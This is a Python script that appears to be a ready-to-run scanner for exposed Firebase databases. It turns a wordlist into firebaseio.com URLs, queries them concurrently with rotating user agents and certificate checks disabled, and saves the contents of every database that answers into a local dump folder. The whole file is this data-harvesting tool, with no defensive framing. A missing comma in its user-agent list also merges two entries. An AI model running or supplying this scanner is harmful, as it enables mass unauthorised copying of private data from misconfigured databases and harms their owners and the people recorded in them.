import requests
import asyncio
from concurrent.futures import ThreadPoolExecutor
import random
import urllib3
import pdb
import sys
import os

user_agents = [
	'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.3', # Chrome, Windows
	'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36', # Chrome, macOS
	'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36', # Chrome, Linux
	'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/73.0', # Firefox, Windows
	'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:61.0) Gecko/20100101 Firefox/73.0', # Firefox, macOS
	'Mozilla/5.0 (X11; Linux i586; rv:31.0) Gecko/20100101 Firefox/73.0', # Firefox, Linux
	'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36 Edg/80.0.361.50' # Edge, Windows
	'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Safari/605.1.15' # Safari, macOS
]

url_list = []
urllib3.disable_warnings()
timeout = 3

async def process_urls():

	with ThreadPoolExecutor(max_workers=10) as executor:
		with requests.Session() as session:

			loop = asyncio.get_event_loop()

			tasks = [
				loop.run_in_executor(
					executor,
					fetch,
					*(session, url) # Allows us to pass in multiple arguments to `fetch`
				)
				for url in url_list
			]

			for response in await asyncio.gather(*tasks):
				pass

def fetch(session, url):

	try:

		response = session.get(url, timeout=timeout, headers={'User-agent' : f'{random.choice(user_agents)}'}, verify=False)
		
		if response.status_code == 200:

			if response.text != 'null':

				with open(f"{FOLDER_NAME}/{url.split('//')[1].split('.')[0]}", "w", encoding='utf8') as file:
					file.write(response.text)
					print(url)
			else:
				print(f"{url}: 200 OK, NULL response.")

	except Exception as e:
		print(f"Exception! {e}")
		


def build_list():

	for line in open(sys.argv[1], "r").readlines():
		url_list.append(f"https://{line.rstrip()}.firebaseio.com/.json")
	

FOLDER_NAME = "firebase_dump"

if len(sys.argv) < 2:
	print(f"Error: Specify a wordlist. \nUsage: \t {sys.argv[0]} <wordlist>")
	sys.exit(0)

if not os.path.isdir(FOLDER_NAME):
	try:
		os.makedirs(FOLDER_NAME)
	except Exception:
		print(f"Error creating folder '{FOLDER_NAME}'.")
		sys.exit(0)

build_list()


# async loop process_urls()
loop = asyncio.get_event_loop()
future = asyncio.ensure_future(process_urls())
loop.run_until_complete(future)